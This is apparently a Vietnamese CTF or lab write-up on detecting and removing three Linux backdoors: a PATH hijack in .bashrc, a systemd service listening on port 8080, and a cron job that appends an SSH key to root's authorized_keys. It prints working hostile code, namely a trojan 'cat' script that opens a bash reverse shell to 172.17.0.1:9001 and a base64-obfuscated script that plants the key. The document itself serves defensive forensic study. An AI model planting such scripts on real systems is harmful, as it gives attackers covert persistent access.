## 1. Phát hiện Backdoor qua .bashrc và /usr/local/sbin/

## a. Kiểm tra thư mục home

```bash
root@13e229253997:~# ls -la /home/bksec/
total 32
drwxr-x--- 1 bksec bksec 4096 Feb 28 07:22 .
drwxr-xr-x 1 root  root  4096 Feb 27 06:11 ..
-rw-r--r-- 1 bksec bksec  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 bksec bksec 3771 Feb 28 07:22 .bashrc
-rw-r--r-- 1 bksec bksec 3807 Feb 27 06:11 .bashrc.bak
drwx------ 2 bksec bksec 4096 Feb 28 07:18 .cache
-rw-r--r-- 1 bksec bksec  807 Jan  6  2022 .profile
```
- .bashrc là file cấu hình mặc định trong Linux, nằm trong thư mục home của mỗi user (/home/username/.bashrc).
- .bashrc.bak KHÔNG phải file mặc định của Linux Đây là File backup được tạo ra bởi ai đó

**Phát hiện:** 
- File `.bashrc` có thời gian sửa đổi `07:22` ngày 28/02 (gần đây)
- File `.bashrc.bak` có thời gian `06:11` ngày 27/02 (cũ hơn)
- Điều này cho thấy `.bashrc` đã bị sửa đổi, khả năng cao là do em trai thêm backdoor

## b. Kiểm tra nội dung .bashrc

```bash
root@8a6e82de61ee:~# cat /home/bksec/.bashrc
[... nội dung bình thường ...]
export PATH="/usr/local/sbin:$PATH"
```

**Phát hiện:** 
- Dòng `export PATH="/usr/local/sbin:$PATH"` được thêm vào cuối file
- Đây không phải là cấu hình chuẩn của `.bashrc`
- Mục đích: thay đổi thứ tự tìm kiếm trong PATH, ưu tiên tìm lệnh cần thiết trong `/usr/local/sbin` trước

## c. Kiểm tra thư mục /usr/local/sbin

```bash
root@8a6e82de61ee:~# ls -la /usr/local/sbin/
total 16
drwxr-xr-x 1 root root 4096 Feb 27 06:11 .
drwxr-xr-x 1 root root 4096 Feb 10 14:05 ..
-rwxr-xr-x 1 root root  177 Feb 27 06:11 cat
-rwxr-xr-x 1 root root 3369 Feb 10 14:11 unminimize
```

**Phát hiện:** 
- File `cat` trong `/usr/local/sbin` có kích thước 177 bytes (rất nhỏ so với lệnh `cat` thật)
- Thời gian tạo `Feb 27 06:11` trùng với thời gian file `.bashrc.bak` - thời điểm em trai dùng máy

## d. Phân tích file cat giả mạo

```bash
root@8a6e82de61ee:~# cat /usr/local/sbin/cat
#!/bin/bash
# Silently open reverse shell in background
(bash -i >& /dev/tcp/172.17.0.1/9001 0>&1 2>/dev/null &) 2>/dev/null
# Execute real cat to avoid suspicion
/bin/cat "$@"
```

**Phát hiện quan trọng:** File này là một reverse shell backdoor:
- Kết nối đến IP `172.17.0.1` port `9001`
- Chạy ngầm trong background để không bị phát hiện
- Sau đó gọi lệnh `cat` thật (`/bin/cat`) để thực hiện chức năng bình thường, tránh gây nghi ngờ

**Cơ chế hoạt động:**
1. User đăng nhập, `.bashrc` chạy, thay đổi PATH
2. Khi user gõ `cat`, thay vì chạy `/bin/cat`, hệ thống tìm thấy `/usr/local/sbin/cat` đầu tiên
3. Script backdoor chạy, mở reverse shell kết nối ra ngoài
4. Sau đó chuyển tiếp tham số cho lệnh `cat` thật để user không thấy gì bất thường

### 🗑️ Cách xóa:
- xóa export PATH="/usr/local/sbin:$PATH" trong /root và trong /home (vim /root/.bashrc, dd, :wq)
- xóa /usr/local/sbin/cat (rm)

---

## **2. Systemd Service Backdoor (Issue 5 - đã xóa)**

### 🔍 Cách tìm:
- Kiểm tra các service tự động khởi động:
  ```bash
  ls -la /etc/systemd/system/multi-user.target.wants/
  ```
- Nhìn service có tên lạ, thời gian tạo trùng với lúc em bạn dùng máy.
- Xem nội dung service:
  ```bash
  cat /etc/systemd/system/system-healthcheck.service
  ```

### 📖 Giải thích:
- Systemd service là chương trình chạy ngầm, tự động khởi động lại nếu bị tắt.
- Service này mở port 8080, chờ kết nối từ bên ngoài và cho shell.

### 🗑️ Cách xóa:
```bash
# Xóa file service
rm /etc/systemd/system/system-healthcheck.service

```

---

## **3. SSH Authorized Keys Backdoor (Issue 3 - đã xóa)**

### 🔍 Cách tìm:
- Kiểm tra crontab và các thư mục cron:
  ```bash
  ls -la /etc/cron.daily/
  total 28
  drwxr-xr-x 1 root root 4096 Feb 27 06:11 .
  drwxr-xr-x 1 root root 4096 Mar  1 06:18 ..
  rw-r--r-- 1 root root  102 Mar 23  2022 .placeholder
  rwxr-xr-x 1 root root 1478 Apr  8  2022 apt-compat
  rwxr-xr-x 1 root root  123 Dec  5  2021 dpkg
  rwxr-xr-x 1 root root  204 Feb 27 06:11 pyshell
  ```
- Nếu thấy file lạ (ví dụ `pyshell`), xem nội dung:
  ```bash
  cat /etc/cron.daily/pyshell
  #!/bin/sh

  VER=$(python3 -c 'import sys; print(".".join(map(str, sys.version_info[:2])))')
  MAJOR=$(echo $VER | cut -d'.' -f1)

  if [ $MAJOR -ge 3 ]; then
    /lib/python3/dist-packages/initiate-pyshell
  fi
  ```
- Theo dấu file được gọi trong script:
  ```bash
  cat /lib/python3/dist-packages/initiate-pyshell
  #!/bin/bash
  KEY=$(echo     "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgd3VhbkB3dWFuCg==" | base64 -d)
  PATH=$(echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d)

  /bin/grep -q "$KEY" "$PATH" || echo "$KEY" >> "$PATH"
  ```
- Kiểm tra SSH authorized keys:
  ```bash
  cat /root/.ssh/authorized_keys
  ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHTdx5Rq5+Obq66cywz5KW9ofVm0NCZ39EPDA2CJDqx1 wuan@wuan
  ```

### 📖 Giải thích:
- Cron job chạy mỗi ngày, thêm SSH key của em bạn vào file `authorized_keys`.
- Nhờ đó, em bạn có thể SSH vào root mà không cần password.

### 🗑️ Cách xóa:
```bash
# Xóa cron job
rm /etc/cron.daily/pyshell

# Xóa script Python backdoor
rm /lib/python3/dist-packages/initiate-pyshell
```

---

## **Tóm tắt 3 kỹ thuật backdoor đã gặp:**

| Backdoor | Vị trí | Cách hoạt động | Cách tìm | Cách xóa |
|----------|--------|----------------|----------|----------|
| **PATH** | `.bashrc` + `/usr/local/sbin/` | Thay đổi PATH, chạy file giả thay lệnh thật | `cat ~/.bashrc` + `ls /usr/local/sbin/` | Xóa file giả, sửa `.bashrc` |
| **Systemd** | `/etc/systemd/system/` | Service chạy ngầm, mở port 8080 | `ls /etc/systemd/system/multi-user.target.wants/` | Xóa file service |
| **SSH key** | Cron job + `/root/.ssh/authorized_keys` | Tự động thêm SSH key mỗi ngày | `ls /etc/cron.daily/` + `cat /root/.ssh/authorized_keys` | Xóa cron job, xóa key |

---

